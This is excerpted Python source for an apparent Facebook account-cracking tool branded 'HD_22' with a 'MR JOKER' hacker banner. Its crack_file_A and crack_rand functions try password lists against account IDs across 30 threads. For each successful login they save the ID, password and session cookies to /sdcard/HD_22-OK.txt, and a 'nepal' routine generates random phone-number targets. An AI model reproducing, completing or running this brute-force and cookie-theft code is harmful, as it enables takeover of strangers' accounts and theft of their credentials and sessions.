...
print('\033[1;91m[\033[1;92m⊀⊁\033[1;91m] \033[1;91m⊀\33[1;92mHD_22-HASAN\33[1;91m⊁ ')
...
\033[1;33m          V:  M:. M. :M .V
\033[1;33m           V.:M.. M. :M.V  
\033[1;33m 𝐅𝐈𝐋𝐄\033[1;91m-𝐇𝐀𝐂𝐊_\033[1;95m𝐌𝐑\033[1;94m_𝐉𝐎𝐊𝐄𝐑
\033[1;33m<><><><><><><><><<><><><><><><><><><><><><><>
 [<>] \033[1;36mOWNER   :  🅜🅓 🅙🅞🅚🅔🅡 🅚🅗🅐🅝
 [<>] \033[1;32mBROTHER :  \033[1;38m𝐌𝐑\033[1;32m 𝐒𝐇𝐀𝐇𝐈\033[1;30m 𝐉𝐎𝐊𝐄𝐑
 [<>] \033[1;34mGITHUB  :  ℳℛ 𝒥𝒪𝒦ℰℛ 𝒦ℋ𝒜𝒩𝒪𝒪
 [<>] \033[1;35mSTATUS  :  𝓜𝓡.𝓙𝓞𝓚𝓔𝓡 𝓗𝓐𝓒𝓚𝓔𝓡
 [<>] \033[1;31mTOOLS   :  M̥ͦR̥ͦ\033[1;37m S̥ͦH̥ͦḀͦH̥ͦI̥ͦ\033[1;35mJ̥ͦO̥ͦK̥ͦE̥ͦR̥ͦ
...
class Main:
    def Awm():
        ...
        elif awm in ['3']:os.system('xdg-open https://github.com/MRJOKER2006')
...
def Awm_File():
    ...
    with tred(max_workers=30) as My_Tanisha:
        ...
        print(f" TOTAL OK ID SAVE IN : {G}/sdcard/HD_22-OK.txt{W}")
        print(f" TOTAL CP ID SAVE IN : {R}/sdcard/HD_22-CP.txt{W}")
...
class Akash:
    ...
    def nepal():
        clear()
        print(f' EXAMPLE  : 9375,9374,9371,9370')
        code = input(f' SELECT   :{G} ');linex()
        print(f' EXAMPLE  : 10000,20000,30000')
        limit = int(input(f' SELECT   :{G} '));linex()
        for n in range(limit):
...
def crack_file_A(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r {W}[HD_22>FILE] {loop}|03-December|{G}{len(oks)}{W}/{R}{len(cps)}')
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r {G}[HD_22-OK] {ids} | {pas}')
                open('/sdcard/HD_22-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                open('/sdcard/HD_22-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def crack_rand(ids,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r {W}[HD_22>RNDM] {loop}|03-December|{G}{len(oks)}{W}/{R}{len(cps)}')
    sys.stdout.flush()
    try:
        for pas in passlist:
            data = {
            ...
            if "access_token" in po:
                uid = str(po['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r {G}[HD_22-OK] {uid} | {pas}')
                open('/sdcard/HD_22-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
